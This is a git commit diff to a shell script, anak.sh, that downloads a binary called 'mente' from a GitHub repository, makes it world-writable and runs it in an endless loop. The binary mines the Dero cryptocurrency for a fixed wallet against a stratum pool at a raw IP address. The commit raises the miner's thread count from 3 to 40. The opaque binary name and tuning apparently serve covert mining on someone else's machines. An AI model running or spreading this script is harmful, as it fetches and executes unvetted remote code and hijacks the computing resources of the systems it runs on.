86ecabd87c9f565a88ef8aec9efd07347b520542
renilo <88342640+renilo@users.noreply.github.com>
2022-12-26 01:59:30 +0700

    Update anak.sh

--- anak.sh
+++ anak.sh
@@ -2,6 +2,6 @@ wget https://github.com/renilo/kuuntul/raw/main/mente
 chmod 777 mente
 
 while :; do
-    ./mente -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK) -r stratum+tcp://51.222.96.66:443 -p stratum -m 3;
+    ./mente -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK) -r stratum+tcp://51.222.96.66:443 -p stratum -m 40;
     sleep 5;
 done
